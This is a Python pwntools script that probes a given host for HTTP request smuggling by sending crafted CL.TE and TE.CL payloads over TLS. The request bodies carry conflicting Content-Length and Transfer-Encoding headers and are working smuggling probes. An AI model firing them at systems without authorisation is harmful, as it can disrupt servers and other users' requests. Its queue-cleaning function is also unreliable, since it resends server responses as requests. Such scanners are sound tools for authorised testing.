import socket
import ssl
import sys
from pwn import *

def def_handler(sig, frame):
    log.warning("Exiting...")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

def send_request(host, request, port=80):
    # Create TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connection
    s.connect((host, port))

    # Send the request
    s.sendall(request.encode())

    # Receive the response
    response = s.recv(4096)
    
    # Close socket
    s.close()

    return response.decode()

def send_request_with_ssl(host, request, port=443):
    # Create TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Set timeout to receive 
    s.settimeout(10)  # 10 seconds

    # SSL Connection
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = context.wrap_socket(s, server_hostname=host)

    try:
        # Connection
        s.connect((host, port))
        # Send the request
        s.sendall(request.encode())
        # Receive the response
        response = s.recv(4096)
        # Close socket
        s.close()
        return response.decode()
    except Exception as e:
        return f"Ocurrió un error: {e}"

def cl_te_detector(host, p):
    request = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 30\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /error HTTP/1.1\r
Foo: x\r
\r
'''

    # Clean the queue
    clean_queue(host,p)

    p.status("CL.TE [0/2]")
    first = send_request_with_ssl(host, request)
    p.status("CL.TE [1/2]")
    second = send_request_with_ssl(host, request)
    
    if "404" in second:
        log.failure("CL.TE detected!!")
    else:
        log.info("Not seem to be vulnerable to CL.TE")

def te_cl_detector(host,p):
    request = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5e\r
POST /404 HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
'''
    
    # Clean the queue
    clean_queue(host,p)

    p.status("TE.CL [0/2]")
    first = send_request_with_ssl(host, request)
    p.status("TE.CL [1/2]")
    second = send_request_with_ssl(host, request)
    
    if "404" in second:
        log.failure("TE.CL detected!!")
    else:
        log.info("Not seem to be vulnerable to TE.CL")

def clean_queue(host,p,n=5):
    request = f'''GET / HTTP/1.1\r
Host: {host}\r
0\r
\r
'''
    p.status("Cleaning queue")
    for i in range(n):
        p.status(f"Cleaning queue {i}/{n}")
        request = send_request_with_ssl(host, request)

if __name__ == '__main__':
    if(len(sys.argv) != 2):
        log.info("Usage: htppRequestSmuggler.py <host>")
        sys.exit(0)

    host = sys.argv[1]
    log.info("Host: " + host)
    p = log.progress("Stage")
    cl_te_detector(host, p)
    te_cl_detector(host, p)
